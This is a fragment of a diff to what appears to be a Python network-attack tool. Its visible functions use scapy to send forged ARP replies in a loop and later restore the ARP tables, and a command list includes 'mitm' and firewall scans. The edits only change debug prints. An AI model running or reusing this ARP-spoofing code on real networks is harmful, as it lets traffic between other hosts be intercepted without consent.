@@ -145,7 +145,6 @@ def ip():
 def spoofer(targetIP, spoofIP, destinationMac):
     packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
     scapy.send(packet, verbose=False)
-    print(packet)
 
 def restore(destinationIP, sourceIP, destinationMac):
     packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
@@ -153,6 +152,7 @@ def restore(destinationIP, sourceIP, destinationMac):
 
 def start(targetIP, gatewayIP, destinationMac):
     packets = 0
+    print("here")
     try:
         while True:
             spoofer(targetIP,gatewayIP, destinationMac)
@@ -257,5 +257,3 @@ url = ["https://www.twitter.com/", "https://www.instagram.com/"]
 commands = ["exit", "scan", "help", "clear", "scan firewall", "mitm", "search", "scan all", "ip", "config"]
 
 main()
-
-
